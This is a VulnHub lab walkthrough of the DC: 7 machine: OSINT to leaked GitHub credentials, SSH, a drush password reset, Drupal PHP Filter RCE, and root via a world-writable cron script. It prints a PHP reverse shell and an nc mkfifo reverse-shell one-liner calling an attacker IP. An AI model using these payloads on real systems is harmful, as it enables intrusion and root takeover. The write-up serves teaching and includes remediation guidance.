# DC: 7 — Think Outside the Box (and Check the Twitter Bio)

DC: 7 opens with a Drupal site and a message telling you to "think outside the box." That message is literal, dude: the entire attack begins not on the machine but on Twitter, where @DC7User's profile links to a GitHub repository holding Drupal database credentials in a PHP config file. Once you have SSH access, drush lets you reset the admin password, a PHP filter module delivers RCE, and a world-writable cron script executed by root is all it takes to land a root shell. Slept on OSINT chain that teaches a real lesson: the perimeter is not just the machine.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | DC: 7 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-7,356/ |
| **Techniques** | OSINT (Twitter/GitHub), SSH with leaked creds, drush password reset, Drupal PHP Filter module RCE, cron job script poisoning |
| **CVEs** | CWE-312 (Cleartext Storage of Sensitive Information), CWE-732 (Incorrect Permission Assignment for Critical Resource) |
| **APT Groups** | APT41 (uses GitHub credential leaks for initial access in enterprise intrusions); Lazarus Group (exploits public code repositories as part of supply chain and credential harvesting operations) |

---

## Attack Summary

```
[Drupal site] → [welcome message: @DC7User]
    → [Twitter: @DC7User profile → GitHub link]
    → [GitHub: staffdb repo → config.php → dc7user:MdR3xOgB7#dW]
    → [SSH: dc7user@target]
    → [mbox: mail about /opt/scripts/backup.sh runs as root via cron]
    → [drush user-password admin --password=raj]
    → [Drupal admin login]
    → [Extend: PHP Filter module enabled]
    → [Basic Page: PHP reverse shell → text format PHP code → Preview]
    → [nc listener: shell as www-data]
    → [python3 pty upgrade]
    → [/opt/scripts/backup.sh: world-writable]
    → [append mkfifo nc reverse shell payload]
    → [wait for cron → root shell]
    → [cat /root/flag.txt]
```

---

## Methodology

1. Network scanning and service identification (Nmap)
2. Web recon: Drupal site, welcome message, username hint
3. OSINT: Twitter profile search, GitHub repository discovery, credential extraction
4. SSH access with discovered credentials
5. Local enumeration: mbox, cron scripts, drush availability
6. Drupal admin access via drush password reset
7. PHP Filter module installation and PHP reverse shell delivery
8. Shell stabilization
9. Privilege escalation: world-writable cron script poisoning
10. Root flag capture

---

## Step 1 — Network Scanning

```bash
netdiscover -r 192.168.1.0/24
# or: nmap -sn 192.168.1.0/24
```

Target confirmed. Full service scan:

```bash
nmap -A 192.168.1.101
```

Expected output:

```
22/tcp open  ssh     OpenSSH 7.x (Debian)
80/tcp open  http    Apache httpd 2.4.x (Drupal)
```

Two services: SSH (22) and Apache with Drupal (80). The HTTP scan reveals `robots.txt` with 15 disallowed entries — standard Drupal hardening. Visit `http://192.168.1.101/` and read the welcome message carefully.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — OSINT: From Twitter to GitHub Credentials

The Drupal welcome page includes the text: "You will need to think outside of the box to get past this one." It also mentions the username `@DC7User`.

**Search Twitter for `@DC7User`.** The profile links to a GitHub account. On GitHub, find the repository `staffdb`. Inside: a PHP configuration file `config.php`.

```bash
# What you find in the GitHub repo config.php:
$db_user = 'dc7user';
$db_pass = 'MdR3xOgB7#dW';
```

| Credential | Value |
|---|---|
| Username | `dc7user` |
| Password | `MdR3xOgB7#dW` |

**Real-world note:** Credential leaks via public GitHub repositories are one of the most consistently exploited initial access vectors in modern intrusions. APT41 has been documented harvesting credentials from public repositories at scale using automated tooling. The 2019 Capital One breach, the 2023 CircleCI incident, and dozens of bug bounty reports each year involve credentials committed to public repos. The fix is always the same: rotate immediately and use pre-commit hooks or GitHub secret scanning to prevent re-exposure.

**MITRE ATT&CK:** T1593.003 — Search Open Websites/Domains: Code Repositories; T1552.001 — Credentials in Files

---

## Step 3 — SSH Access and Local Enumeration

```bash
ssh dc7user@192.168.1.101
# Password: MdR3xOgB7#dW
```

Enumerate the home directory immediately:

```bash
ls -la ~
cat mbox
```

The `mbox` file contains a mail notification about `/opt/scripts/backup.sh`. This script is executed by root via cron. Read it:

```bash
cat /opt/scripts/backup.sh
```

Two critical observations:
1. The script uses `drush` to interact with Drupal.
2. Check the permissions on the script file.

```bash
ls -la /opt/scripts/backup.sh
# Look for writable bits by www-data or your current user
```

**Drush** (Drupal Shell) is a command-line utility for managing Drupal. It can reset user passwords, clear caches, enable modules, and perform database operations — all from the command line, without needing the web interface. If drush is available and the web server runs Drupal, it is a powerful administrative escalation tool.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1057 — Process Discovery

---

## Step 4 — Drupal Admin Password Reset via drush

With SSH access as `dc7user`, reset the Drupal admin password using drush:

```bash
drush user-password admin --password=raj
```

Expected output:

```
Changed password for admin.
```

Navigate to `http://192.168.1.101/user/login` and log in:

```
Username: admin
Password: raj
```

You now have full Drupal admin access. This is a critical finding: if an attacker can run drush as the web application user (or as any user with filesystem access to the Drupal installation), they can reset any CMS user's password without knowing the current one.

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Step 5 — RCE via PHP Filter Module

In the Drupal admin panel:

1. Go to **Manage > Extend** (Modules page).
2. Search for "PHP Filter" — if not already installed, download and install it from Drupal.org.
3. Enable the **PHP Filter** module.
4. Go to **Content > Add content > Basic page**.
5. In the body, paste a PHP reverse shell. Edit `$ip` and `$port`:

```php
<?php
set_time_limit(0);
$ip   = '192.168.1.106';   // Attacker IP
$port = 9001;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

6. Set the text format dropdown to **PHP code**.
7. Check **Published**.
8. Start a listener on the attacker machine:

```bash
nc -nvlp 9001
```

9. Click **Preview** or **Save** on the Drupal page.

Shell received as `www-data`. (☞ﾟヮﾟ)☞

**Why is PHP Filter dangerous?** It instructs Drupal to pass page content through the PHP interpreter. Any authenticated user who can create content with the PHP Filter text format can execute arbitrary server-side code. The Drupal security team has deprecated it since Drupal 7 and recommends Twig templating instead. Never enable this module on any production site.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell; T1505.003 — Server Software Component: Web Shell

---

## Step 6 — Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Background with Ctrl+Z, then:
stty raw -echo; fg
```

Now interactive with full TTY capabilities.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Privilege Escalation via Cron Script Poisoning

Check the backup script permissions again from www-data:

```bash
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ... backup.sh
```

World-writable! The script is owned by root but any user can write to it. Since root executes it via cron, we can append a reverse shell payload and it will execute as root when the cron fires.

Generate the payload using msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R
```

Output (a mkfifo-based one-liner):

```
mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg
```

Append to the backup script (from the www-data shell):

```bash
echo 'mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0</tmp/ulgg | /bin/sh >/tmp/ulgg 2>&1; rm /tmp/ulgg' >> /opt/scripts/backup.sh
```

Start a listener on the attacker machine:

```bash
nc -nvlp 8888
```

Wait for the cron job to fire (usually within 1-5 minutes). A root shell arrives on the listener.

**Real-world note:** World-writable cron scripts are a critical finding in internal pentests. They appear when administrators need quick fixes and set overly permissive file permissions, then forget to tighten them. In 2022, multiple red team engagements at financial institutions found root-executed cron scripts writable by service accounts, enabling trivial privilege escalation after initial web application compromise.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron; T1574 — Hijack Execution Flow

---

## Step 8 — Root Flag

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
ls /root
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root confirmed. GG.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used |
|---|---|---|---|
| SSH credential | dc7user:MdR3xOgB7#dW | GitHub repo staffdb/config.php (OSINT via Twitter) | SSH initial access |
| Drupal admin credential | admin:raj (reset) | drush password reset as dc7user | Drupal admin panel access |
| Root flag | (contents of `/root/flag.txt`) | `/root/flag.txt` | Read as root via cron script poisoning |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | OSINT extended beyond the machine: Twitter → GitHub → credentials | APT41 harvests credentials from public repos at scale using automated tools | Never store credentials in source code; use environment variables and secrets managers; enable GitHub secret scanning |
| 2 | drush allows admin password reset without DB access | Any user with filesystem access to a Drupal install can reset admin passwords | Restrict drush to root/admin users; audit CLI tools for all CMS installations |
| 3 | PHP Filter module executes arbitrary PHP via CMS content | PHP Filter is a known dangerous module; CMS content execution is a consistent web application RCE vector | Never enable PHP Filter on production Drupal; use Twig templates; audit enabled modules |
| 4 | World-writable cron script executed by root | Root-owned scripts with world-writable permissions are critical PE findings in >30% of internal pentests | All scripts executed by root via cron must be owned by root with mode 750; audit with: `find /opt /etc/cron* -perm -002 -type f` |
| 5 | SSH password reuse from GitHub config | Credential reuse across services is extremely common; one leak compromises multiple systems | Enforce unique passwords per service; use SSH key pairs; implement secrets rotation |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Reconnaissance | Search Open Websites: Code Repositories | T1593.003 |
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Persistence | Persistence | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow | T1574 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron | T1053.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Rotate all credentials** from the GitHub repository immediately; audit what else that config file grants access to
2. **Set scripts executed by root via cron to root-only permissions:** `chown root:root /opt/scripts/backup.sh && chmod 750 /opt/scripts/backup.sh`
3. **Disable or uninstall Drupal PHP Filter module:** `drush pm-disable phpfilter && drush pm-uninstall phpfilter`
4. **Audit all drush access:** restrict the drush binary permissions so only root and the web admin can execute it
5. **Enable GitHub secret scanning** on all repositories; add pre-commit hooks (`git-secrets`, `gitleaks`) to prevent credential commits
6. **Restrict SSH access** to key-based authentication only: `PasswordAuthentication no` in sshd_config

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all public repositories; audit Drupal module configurations |
| Protect | Access Control | Rotate exposed credentials; restrict drush; disable PHP Filter |
| Protect | Data Security | Implement secrets management; GitHub secret scanning; pre-commit hooks |
| Detect | Anomalies and Events | Alert on drush executions; monitor Drupal admin panel activity; detect world-writable cron scripts |
| Respond | Response Planning | Revoke GitHub credentials; remove PHP Filter; fix cron script permissions; rotate all affected accounts |
| Recover | Recovery Planning | Rebuild Drupal from clean state; audit all cron jobs and scheduled tasks |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | Cron scripts owned by root, mode 750; drush restricted to privileged accounts |
| IA-5 | Authenticator Management | Rotate dc7user credentials from public GitHub; unique passwords per service |
| CM-7 | Least Functionality | Disable PHP Filter module; restrict drush to admin context |
| SA-15 | Development Process | Implement pre-commit credential scanning in CI/CD; no secrets in source code |
| SC-28 | Protection of Information at Rest | Credentials in environment variables or secrets manager, never in config files committed to public repos |

### CISA KEV

CWE-312 (Cleartext Storage of Sensitive Information in publicly accessible code repositories) is a pattern addressed in multiple CISA alerts (AA21-008A, AA22-228A). CISA recommends implementing automated scanning for credentials in version control and mandatory secrets rotation protocols for any exposure.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Credentials and Secrets (no plaintext in repos; secrets rotation) | MIL3 |
| Vulnerability and Threat Management (THREAT) | Identify and Assess Vulnerabilities (CMS module audits; cron script audits) | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage Configuration Baseline (Drupal modules; cron job permissions) | MIL2 |

### MITRE D3FEND

- **D3-SCF** (Software Configuration Inspection): audit Drupal modules; detect PHP Filter enabled
- **D3-SCL** (Script Execution Blocking): block PHP execution in CMS content directories
- **D3-OAM** (Operating System Administrative Management): enforce cron script ownership and permissions

---

## Final Thoughts

DC: 7 is goated for teaching one of the most underrated skills in offensive security: OSINT that starts outside the target's IP range. The machine's welcome message pointing to a Twitter handle that points to GitHub credentials is a realistic simulation of how real breaches begin — not with a scanner hitting the external perimeter, but with an analyst finding something they were not supposed to find on a public platform.

The cron script poisoning at the end is a textbook example of why every sysadmin should run `find / -perm -002 -type f 2>/dev/null` after deploying any cron job. One loose chmod and your scheduled maintenance becomes an attacker's persistent root shell.

Think outside the box. Always.

Thanks guys!! (❍ᴥ❍ʋ)
